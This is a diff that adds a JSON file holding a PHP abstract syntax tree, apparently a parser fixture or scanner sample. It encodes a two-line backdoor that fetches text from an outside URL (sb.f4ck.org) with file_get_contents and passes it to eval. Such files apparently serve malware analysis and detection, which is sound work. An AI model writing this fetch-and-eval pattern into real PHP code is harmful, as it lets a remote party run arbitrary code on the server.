@@ -1,0 +1,85 @@
+[
+    {
+        "nodeType": "Stmt_Expression",
+        "expr": {
+            "nodeType": "Expr_Assign",
+            "var": {
+                "nodeType": "Expr_Variable",
+                "name": "b",
+                "attributes": {
+                    "startLine": 3,
+                    "endLine": 3
+                }
+            },
+            "expr": {
+                "nodeType": "Expr_FuncCall",
+                "name": {
+                    "nodeType": "Name",
+                    "parts": [
+                        "file_get_contents"
+                    ],
+                    "attributes": {
+                        "startLine": 3,
+                        "endLine": 3
+                    }
+                },
+                "args": [
+                    {
+                        "nodeType": "Arg",
+                        "name": null,
+                        "value": {
+                            "nodeType": "Scalar_String",
+                            "value": "http:\/\/sb.f4ck.org\/1.txt",
+                            "attributes": {
+                                "startLine": 3,
+                                "endLine": 3,
+                                "kind": 2,
+                                "rawValue": "\"http:\/\/sb.f4ck.org\/1.txt\""
+                            }
+                        },
+                        "byRef": false,
+                        "unpack": false,
+                        "attributes": {
+                            "startLine": 3,
+                            "endLine": 3
+                        }
+                    }
+                ],
+                "attributes": {
+                    "startLine": 3,
+                    "endLine": 3
+                }
+            },
+            "attributes": {
+                "startLine": 3,
+                "endLine": 3
+            }
+        },
+        "attributes": {
+            "startLine": 3,
+            "endLine": 3
+        }
+    },
+    {
+        "nodeType": "Stmt_Expression",
+        "expr": {
+            "nodeType": "Expr_Eval",
+            "expr": {
+                "nodeType": "Expr_Variable",
+                "name": "b",
+                "attributes": {
+                    "startLine": 4,
+                    "endLine": 4
+                }
+            },
+            "attributes": {
+                "startLine": 4,
+                "endLine": 4
+            }
+        },
+        "attributes": {
+            "startLine": 4,
+            "endLine": 4
+        }
+    }
+]
